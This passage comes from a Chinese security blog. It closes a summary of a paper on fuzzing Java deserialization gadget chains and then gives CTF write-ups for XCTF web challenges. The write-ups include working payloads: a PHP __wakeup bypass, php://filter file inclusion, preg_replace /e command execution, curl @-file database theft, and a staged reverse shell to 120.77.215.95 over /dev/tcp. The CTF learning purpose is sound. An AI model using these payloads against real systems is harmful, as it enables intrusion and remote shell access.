是动态方法调用的数量，<span class="math inline">\(M\)</span>
是这些调用的候选项的平均数量，<span class="math inline">\(e\)</span>
是入口点的数量。</p>
<h3 id="定理-2">定理 2</h3>
<p>ODDFuzz 的搜索复杂度是 <span
class="math inline">\(O(eM^n)\)</span>，其中所有符号都遵循定理 1。</p>
<h2 id="步骤-4根据注入对象相关约束建立-iocd">步骤
4：根据注入对象相关约束建立 IOCD</h2>
<p>两个步骤：</p>
<ol type="1">
<li>约束提取</li>
<li>基于注入对象相关约束的 IOCD 生成</li>
</ol>
<p>首先，JDD 遵循这个 gadget
链的调用序列来提取执行路径，然后发现影响输入的三种类型的约束：</p>
<h3 id="object-和-field-实例之间的层次关系">Object 和 Field
实例之间的层次关系</h3>
<p>对于每个 Fragment，JDD 首先使用数据流分析来确定哪些 Fragment 与下一个
Fragment 链接，然后使用后续 Fragment 的头部方法确定 Field
的实际类型。</p>
<blockquote>
<p>比如图 1 中第 3 行，HashMap 对象具有一个 Field table。</p>
</blockquote>
<p>但是有一些定义的是通用类型或者 Object，因此 JDD 会继续向下追踪。</p>
<blockquote>
<p>比如图 1 中，key 将 Fragment I 连接到 II，obj.key 和 this.key 将
Fragment II 连接到 III，Fragment III 将 Fragment IV 连接到 IV。</p>
</blockquote>
<h3 id="与-field-相关的条件分支">与 Field 相关的条件分支</h3>
<p>JDD 标记在不同的执行路径中共享的约束为
dominator，这意味着所有执行路径都需要满足这些约束。</p>
<p>在数据流跟踪过程中，JDD 同时通过识别受 Field 影响的变量来收集与 Field
相关的条件分支约束。</p>
<p>此外，为了确保程序执行不会触发异常，还应满足一些隐式约束。</p>
<blockquote>
<p>例如，在调用某些方法时， Field 不能为
null。另一个例子是强制类型转换，它要求 Field 应是特定类型的实例。</p>
</blockquote>
<h3 id="field-依赖约束">Field 依赖约束</h3>
<p>其中包括 Field 之间的条件约束，如图 3 中所示的约束 i-iii。</p>
<p>需要注意的是，sink 点通常要求特定 Field 由攻击者控制以注入
payload。</p>
<p>JDD 将标记这些 Field 以检查它们是否可以被输入污染。</p>
<p>为了找到 Field 依赖性约束，通常情况下，JDD 会过滤影响多个 Field
的条件约束，然后将这些 Field 标记为相关约束的 Field 依赖。</p>
<p>此外，JDD 还考虑了 Java 反射的特定要求。</p>
<blockquote>
<p>例如，在 Java 反射中使用的三个 Field className、methodName 和 args
应确保目标类包含目标方法。</p>
</blockquote>
<h3 id="注入对象构造图">注入对象构造图</h3>
<p>在提取这些约束之后，JDD
使用一种新的数据结构，称为注入对象构造图（IOCD）来建模对象结构和 Field
的依赖关系。</p>
<p>有两个子步骤：</p>
<ol type="1">
<li><p>JDD 将包含在 gadget 链中的实例化对象视为
ClassNodes。每个ClassNode 存储以下信息：类名和相关的
FieldNodes，表示在反序列化过程中可能使用的 Field 。另一方面，FieldNode
存储这些 Field 的相关约束信息，并标记这些约束是否可以静态确定为
dominator。</p></li>
<li><p>根据结构约束，通过 FieldNodes 将 ClassNodes
相互连接，从而指示实例化对象之间的层次关系。</p>
<blockquote>
<p>例如，在示例中，JDD 将构造 ClassNodes 表示 NodeImpl、UIDfaults 和
ConcurrentHashMap 的实例。然后，根据结构约束，JDD 将从 UIDfaults 和
ConcurrentHashMap ClassNodes 建立到 NodeImpl ClassNode 的相同
FieldNode（即 key）的边，这意味着至少存在两个 NodeImpl 实例。因此，JDD
将包含一个额外的 NodeImpl ClassNode 来表示两个 NodeImpl
实例的存在，其中每个实例的 Field key 分别分配给 UIDfaults 和
ConcurrentHashMap 实例，如图 3（a）所示。</p>
</blockquote></li>
</ol>
<h2 id="步骤-5iocd-增强方向性模糊测试">步骤 5：IOCD
增强方向性模糊测试</h2>
<p>具体来说，首先基于 <strong>IOCD</strong>
生成初始种子，然后使用它们来驱动模糊测试。</p>
<p>在方向性模糊测试的探索阶段，<strong>JDD</strong> 利用覆盖的
<strong>dominator</strong> 约束的数量来评估种子的能效，并引导
<strong>fuzzer</strong> 覆盖更多的 <strong>dominator</strong>
约束，直到达到 <strong>sink</strong> 点。</p>
<p>在方向性模糊测试的利用阶段，JDD 仅变动与 sink 点相关的 Field。在每个
Field 的变动过程中，根据 IOCD 调整其他相关 Field，以修复基于 IOCD 的跨
Field 依赖关系。</p>
<h3 id="基于-iocd-的种子生成">基于 IOCD 的种子生成</h3>
<p>考虑到 Cross-Field 依赖和嵌套对象结构，JDD 使用基于 IOCD 引导的
fuzzer ，并考虑 Field 之间的约束来生成正确类层次结构的对象。</p>
<p>具体来说，基于 IOCD 从 ClassNodes
生成无参数实例，并根据有向边建立这些实例的类层次结构，如图 3 所示。</p>
<p>随后，从根 ClassNode 节点开始，在每个 FieldNode
上执行广度优先遍历。</p>
<p>JDD 将提取这些 FieldNodes 的 dominator
约束，并调用约束求解器生成适当的值，然后将这些值分配给相应的 Field
。</p>
<p>当双向边存在 FieldNodes 之间的时候，表示两个 Field
之间存在约束依赖关系，JDD 会从相关 FieldNodes 提取 dominator
条件约束。</p>
<p>然后，使用约束求解器解决这些约束，以找到同时满足这些约束的值。</p>
<h3 id="依赖感知种子变动">依赖感知种子变动</h3>
<p>IOCD 从以下三个方面显著提高了模糊测试的效率：</p>
<ol type="1">
<li>选择适当的 Field 进行变动。</li>
<li>通过约束信息减少不确定的变动空间。</li>
<li>考虑 Field 之间的依赖关系和嵌套对象结构。</li>
</ol>
<p>在变动 Field 时，需要考虑到该 Field 与其他相关 Field 或包含该 Field
的上级实例对象之间的约束关系。详细策略可在表 2 中找到。</p>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240218223439227.png"
alt="Table 2: Mutation Strategy." />
<figcaption aria-hidden="true">Table 2: Mutation Strategy.</figcaption>
</figure>
<h4 id="基于条件约束的变动">基于条件约束的变动</h4>
<p>首先，根据种子执行获取的反馈信息，JDD 匹配来自 IOCD
的适当条件约束，这些约束是从指定程序执行流程中导出的 gadget 链。</p>
<p>然后利用这些条件约束来有选择性地指导注入对象的结构变动。</p>
<p>为了记录所选的条件约束策略，JDD 定义了一个唯一标识符，并分配一个 2
位标志来指示每个条件约束的变动策略。</p>
<p>第一位用于指示约束是否被使用（0：未选中，1：选中），第二位表示约束是否满足（true
or false）。</p>
<p>有了这个标识符，JDD
更倾向于选择未使用的策略，以涵盖更多种类的条件约束组合。</p>
<p>以下是如何基于反馈信息生成条件约束分支策略的解释：</p>
<ol type="1">
<li>如果 JDD 解决了 ClassCastException 或 NullPointerException
异常信息，则可以根据错误位置信息（类名、代码行号）从 IOCD
中匹配引起异常的相关 Field ，并要求这些 Field 满足特定的约束，即 <span
class="math inline">\(field \; != \; null，field \; instanceof \;
X.class\)</span>。</li>
<li>提取当前达到的条件约束和下一个 dominator
条件约束之间的所有约束，并根据每个约束的标识符选择变动策略。</li>
<li>如果当前和下一个 dominator 条件约束之间没有非 dominator
条件约束，则为当前 dominator 和前面的条件约束选择随机变动策略，注意
dominator 条件约束不改变第二位标志。</li>
<li>如果程序已达到汇合点但未触发预期的恶意指令，则 JDD
首先检查是否存在多种构造恶意数据的方法（即从不同 Field
构造）。如果存在这样的变化，JDD 使用 IOCD 中记录的信息调用不同的 Field
来构造恶意数据。否则，随机更改条件约束策略。</li>
<li>如果已使用所有条件约束策略的组合，则为从未标记为现有条件约束的 IOCD
中随机选择的 Field 分配 50％ 的概率进行变动。</li>
<li>当程序到达汇合点并捕获到写入的恶意指令时，这意味着注入对象是可利用的，并且相应的片段链被归类为可利用。如果超过了时间阈值，或者根据上述特定类型的信息，可以直接确定为不可利用，当前测试将终止，并且将调用下一个
IOCD 来对应下一个片段链，以开始新一轮的测试。</li>
</ol>
<h4 id="基于对象结构约束的变动">基于对象结构约束的变动</h4>
<p>在获得条件约束之后，JDD 调用约束求解器来调整对象的结构。</p>
<p>然而，正如 IOCD 所示， Field 之间存在复杂的约束关系。</p>
<p>修改其中一个 Field 不仅会影响相应的 ClassNode，还会影响其 Field
以及与其他 ClassNode 关联的 Field 。</p>
<p>因此，仅基于条件约束对单个 Field
进行简单调整可能会损害对象的结构有效性。</p>
<p>为了解决这个问题，本文提出了级联变动策略。</p>
<p>当 JDD 调整一个 Field 时，它会级联地检查受此 Field 影响的其他 Field
是否也需要调整。</p>
<p>如果需要，它会同时调整它们，以保持注入对象的结构有效性。</p>
<p>具体来说，变动策略可以分为两个级别：单 Field 和跨 Field 。</p>
<ol type="1">
<li>单 Field 级别。变动单个 Field ，该 Field 与其他 Field
没有任何约束。利用约束求解器来解决相关的条件约束，以调整 Field
的赋值。</li>
<li>跨 Field 级别。当变动一个具有其他 Field 之间相互约束的 Field
时，确保保留相关 Field 中的相关信息，并保持对象结构的有效性。</li>
</ol>
<h4 id="基于-field-依赖约束的变动">基于 Field 依赖约束的变动</h4>
<p>基于对受影响 Field
进行最小修改以避免在变动后破坏有效信息的见解，并利用类层次结构的知识，JDD
实现了以下两种跨 Field 级别的变动器，即嵌套 Field
值重用和顺序固定调整。</p>
<h5 id="嵌套-field-值重用">嵌套 Field 值重用</h5>
<p>在变动特定 Field （即 mutatedField）后，递归检查和调整其相关 Field
。</p>
<p>具体来说，首先根据 IOCD 上的相关支配约束调整 mutatedField 的 Field
。</p>
<p>然后，检测当前约束策略影响的 Field ，并重用变动后和变动前 Field
实例之间共享的实例。</p>
<h5 id="顺序固定调整">顺序固定调整</h5>
<p>如果 JDD 打算变动特定 Field （即 field1），并且存在与多个 Field
相关的约束（即 field2、field3），JDD 分别提取与这三个 Field
相关的约束。</p>
<p>然后调用约束求解器为 field1 找到满足所有相关约束的值，同时尽量减少
field2 和 field3 的调整。</p>
<p>具体来说，约束求解器首先固定 field2 和 field3，然后确定 field1
的适当值。</p>
<p>如果它无法找到满足 field1 的其他约束的解决方案，则逐步调整 field2 和
field3 并继续解决过程。</p>
]]></content>
      <categories>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>Paper</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF 攻防世界 题解</title>
    <url>/Platform-ADWorld/</url>
    <content><![CDATA[<p><strong>XCTF</strong>联赛的题目复现。</p>
<span id="more"></span>
<h3 id="web">Web</h3>
<h4 id="nannannannan-batman">NaNNaNNaNNaN-Batman</h4>
<p>把文件中的<strong>eval</strong>改成<strong>alert</strong>，后缀改成<strong>.html</strong>后浏览器打开，得到完整的代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;c&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">length</span> == <span class="number">16</span>) <span class="keyword">if</span> (e.<span class="title function_">match</span>(<span class="regexp">/^be0f23/</span>) != <span class="literal">null</span>) <span class="keyword">if</span> (e.<span class="title function_">match</span>(<span class="regexp">/233ac/</span>) != <span class="literal">null</span>) <span class="keyword">if</span> (e.<span class="title function_">match</span>(<span class="regexp">/e98aa$/</span>) != <span class="literal">null</span>) <span class="keyword">if</span> (e.<span class="title function_">match</span>(<span class="regexp">/c7be9/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = [<span class="string">&quot;fl&quot;</span>, <span class="string">&quot;s_a&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> n = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;_h0l&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> r = [<span class="string">&quot;g&#123;&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_0&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> i = [<span class="string">&quot;it&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> s = [t, n, r, i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">13</span>; ++o) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o % <span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">            s[o % <span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>
<p>很简单的绕过，长度要求<strong>16</strong>位，<strong>be0f23</strong>开头，<strong>e98aa</strong>结尾，合并相同部分，输入<strong>be0f233ac7be98aa</strong>，得到<strong>flag{it's_a_h0le_in_0ne}</strong>。</p>
<h4 id="unserialize3">unserialize3</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
<p><strong>CVE-2016-7124</strong>，当序列化字符串中的表示对象数量的值大于实际个数时会跳过**__wakeup()<strong>函数的执行，因此构造</strong>payload<strong>为</strong>O:4:"xctf":1:{s:4:"flag";s:3:"111";}<strong>，得到</strong>cyberpeace{19d4c21c56f7a95ad5612bfbc13411df}**。</p>
<h4 id="cat">Cat</h4>
<p><strong>fuzz</strong>后发现宽字节出现报错，提示了一个<strong>UnicodeEncodeError
at
/api/ping</strong>，细看报错信息是<strong>Django</strong>的框架，还有一些源码泄漏，那么可以对此错误信息进行分析，大致可以推测出来是通过<strong>php</strong>获取数据来发给<strong>Django</strong>的<strong>api</strong>。</p>
<p>先是合并了<strong>requests.FILES</strong>和<strong>requests.POST</strong>数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 合并 requests.FILES 和 requests.POST</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> request.FILES.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, InMemoryUploadedFile):</span><br><span class="line">                v = v.read()</span><br><span class="line">            request.FILES[k] = v</span><br><span class="line">        request.POST.update(request.FILES)</span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs) </span><br></pre></td></tr></table></figure>
<p>然后是核心的<strong>ping()</strong>函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@process_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 转义</span></span><br><span class="line">    data = request.POST.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    data = escape(data) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[a-zA-Z0-9\-\./]+$&#x27;</span>, data):</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Invalid URL&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(os.popen(<span class="string">&quot;ping -c 1 \&quot;%s\&quot;&quot;</span> % data).read())</span><br></pre></td></tr></table></figure>
<p>以及<strong>escape()</strong>函数，对敏感字符进行了转义，最后进行<strong>gbk</strong>编码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        c = data[i]</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> (<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;`&#x27;</span>):</span><br><span class="line">            r = r + <span class="string">&#x27;\\&#x27;</span> + c</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = r + c</span><br><span class="line">    <span class="keyword">return</span> r.encode(<span class="string">&#x27;gbk&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>因为<strong>%A0</strong>之类的宽字节并不在<strong>GBK</strong>编码表中，故转码时出错，且<strong>Django</strong>未关闭<strong>debug</strong>，故抛出了错误信息。</p>
<p>那么在<strong>php</strong>中构造<strong>post</strong>请求发送给其他服务就会用到<strong>CURLOPT_POSTFILEDS</strong>这个函数，且当<strong>CURLOPT_SAFE_UPLOAD</strong>为<strong>False</strong>的时候，可以通过<strong>@/绝对路径</strong>的方式来访问文件。</p>
<p>还有就是在开头的这段代码中将<strong>v</strong>和<strong>InMemoryUploadedFile</strong>比较，一样的话就读取它，而<strong>Django</strong>的<strong>debug</strong>模式开启后，所有的数据库查询将会以<strong>django.db.connection.queries</strong>的形式被保存在内存中
, 这会消耗大量的内存。</p>
<p>而在报错页面中也给出了数据库的绝对路径<strong>/opt/api/database.sqlite3</strong>，那么只要访问数据库的绝对路径就可以读取到全部的数据了。</p>
<p>构造<strong>payload</strong>为<strong>/?url=@/opt/api/database.sqlite3</strong>，得到<strong>flag</strong>为<strong>AWHCTF{yoooo_Such_A_G00D_@}</strong>。</p>
<h4 id="ics-05">ics-05</h4>
<p>点开设备维护中心跳转到了<strong>index.php</strong>，右键源代码看见<strong>?page=index</strong>，根据提示推测是任意文件读取。</p>
<p>构造<strong>?page=php://filter/convert.base64-encode/resource=index.php</strong>得到源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">posix_setuid</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>此处的切入点在<strong>preg_replace()</strong>的<strong>/e</strong>模式会造成命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pat=/south/e&amp;rep=system(%27ls%27)&amp;sub=south</span><br></pre></td></tr></table></figure>
<p>然后得到<strong>cyberpeace{a4d5263a734d6818bbcdee5be09eb1c4}</strong>。</p>
<h4 id="ics-06">ics-06</h4>
<p><strong>id</strong>爆破到<strong>2333</strong>得到<strong>cyberpeace{5200767bf6b1f80ef28c49c10a21774b}</strong>。</p>
<h4 id="triangle">Triangle</h4>
<h4 id="wtf.sh-150">wtf.sh-150</h4>
<p><strong>/post.wtf?post=../</strong>存在路径穿越，可以读取到源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ source user_functions.sh</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/css/std.css&quot;</span> &gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">$ <span class="keyword">if</span> contains <span class="string">&#x27;user&#x27;</span> $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists <span class="string">&quot;users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;&quot;</span></span><br><span class="line">$ then</span><br><span class="line">$   local username=$(head -n <span class="number">1</span> users/$&#123;URL_PARAMS[<span class="string">&#x27;user&#x27;</span>]&#125;);</span><br><span class="line">$   <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;$&#123;username&#125;&#x27;s posts:&lt;/h3&gt;&quot;</span>;</span><br><span class="line">$   <span class="keyword">echo</span> <span class="string">&quot;&lt;ol&gt;&quot;</span>;</span><br><span class="line">$   get_users_posts <span class="string">&quot;$&#123;username&#125;&quot;</span> | <span class="keyword">while</span> read -r post; <span class="keyword">do</span></span><br><span class="line">$       post_slug=$(awk -F/ <span class="string">&#x27;&#123;print $2 &quot;#&quot; $3&#125;&#x27;</span> &lt;&lt;&lt; <span class="string">&quot;$&#123;post&#125;&quot;</span>);</span><br><span class="line">$       <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&lt;a href=\&quot;/post.wtf?post=$&#123;post_slug&#125;\&quot;&gt;$(nth_line 2 &quot;</span>$&#123;post&#125;<span class="string">&quot; | htmlentities)&lt;/a&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line">$   done </span><br><span class="line">$   <span class="keyword">echo</span> <span class="string">&quot;&lt;/ol&gt;&quot;</span>;</span><br><span class="line">$   <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">&quot;$&#123;COOKIES[&#x27;USERNAME&#x27;]&#125;&quot;</span> = <span class="string">&#x27;admin&#x27;</span> ]] &amp;&amp; [[ $&#123;username&#125; = <span class="string">&#x27;admin&#x27;</span> ]]</span><br><span class="line">$   then</span><br><span class="line">$       get_flag1</span><br><span class="line">$   fi</span><br><span class="line">$ fi</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到这边的逻辑是登陆为<strong>admin</strong>就可以拿到<strong>flag</strong>，同时利用路径穿越查看其他泄漏出的路径。然后在<strong>/post.wtf?post=../users/</strong>中发现<strong>admin</strong>用户的<strong>token</strong>，就可以伪造登陆来获得<strong>flag</strong>。</p>
<p>但是只拿到了一半，<strong>Flag:
xctf{cb49256d1ab48803</strong>，后半部分笔记取自瑞雪丰年师傅<a
href="https://blog.cindemor.com/post/ctf-fairy-1.html">博客</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s\\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;z</span><br><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls\\ </span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\ </span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;g</span><br><span class="line">LC_COLLATE=C ls&gt;&gt;_</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;95</span><br><span class="line">&gt;5.\\</span><br><span class="line">&gt;21\\</span><br><span class="line">&gt;7.\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;12\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;et\\</span><br><span class="line">&gt;wg\\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-i\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;sh\\</span><br><span class="line">&gt;ba\\</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/120.77.215.95/7777 0&gt;&amp;1^C</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xctf&#123;cb49256d1ab48803149e5ec49d3c29ca&#125;</span><br></pre></td></tr></table></figure>
<h4 id="guess">Guess</h4>
<p>先是一个文件包含，http://111.198.29.45:55174/?page=php://filter/convert.base64-encode/resource=index。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>,<span class="variable">$page</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$page</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="keyword">include</span>(<span class="variable">$page</span>.<span class="string">&#x27;.php&#x27;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;error!&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后看看上传页面，<strong>http://111.198.29.45:55174/?page=php://filter/convert.base64-encode/resource=upload</strong>。</p>
